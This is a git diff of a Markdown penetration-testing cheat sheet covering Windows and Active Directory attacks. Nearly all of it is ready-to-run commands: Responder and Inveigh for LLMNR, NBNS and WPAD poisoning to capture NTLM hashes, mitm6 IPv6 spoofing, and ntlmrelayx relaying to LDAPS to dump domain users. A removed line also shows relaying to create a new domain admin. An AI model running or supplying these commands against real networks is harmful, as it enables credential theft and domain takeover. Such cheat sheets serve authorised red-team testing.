@@ -441,35 +441,24 @@
    * `.\psexec.exe -accepteula -sid taskmgr.exe`
 
 
-## NTLMv2 hashes
+## Responder
 
 * [Responder](https://github.com/lgandx/Responder)
-   * responder -I eth0 -wFb
-      * `-w = WPAD rogue proxy server`
-      * `-F = force NTLM/Basic authentication on wpad.dat file retrieval`
-      * `-b = Basic HTTP authentication`
+   * `responder -I eth0 -wfd`
 * [InveighZero](https://github.com/Kevin-Robertson/InveighZero)
    * `Inveigh.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y [-Elevated N]`
 * [Inveigh](https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Invoke-Inveigh.ps1)
    * `Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y [-Elevated N]`
 
 
-## NTLM Relay
+## Mitm6
 
-* Choose attack
-   * Create new DA (if DA account is relayed)
-      * `ntlmrelayx.py -6 -t ldaps://<dc_ip>`
-   * Dump LDAP (any domain user)
-      * `ntlmrelayx.py -6 -t ldaps://<domain> -wh attacker-wpad --delegate-access`
-      * Filter all usernames
-        * `cat domain_users.grep | awk -F '\t' '{print $3}' | sort -u > users.txt`
-   * Dump SAM (default)
-      * `ntlmrelayx.py -6 -t <target>`
-* Choose trigger
-   * mitm6
-      * `mitm6 -d <domain>`
-   * responder
-      * `responder -I eth0`
+* Screen 1
+  * `mitm6 -d <domain>`
+* Screen 2
+  * `ntlmrelayx.py -6 -t ldaps://<domain> -wh attacker-wpad`
+* Filter all usernames
+  * `cat domain_users.grep | awk -F '\t' '{print $3}' | sort -u > users.txt`
 
 
 ## Chisel
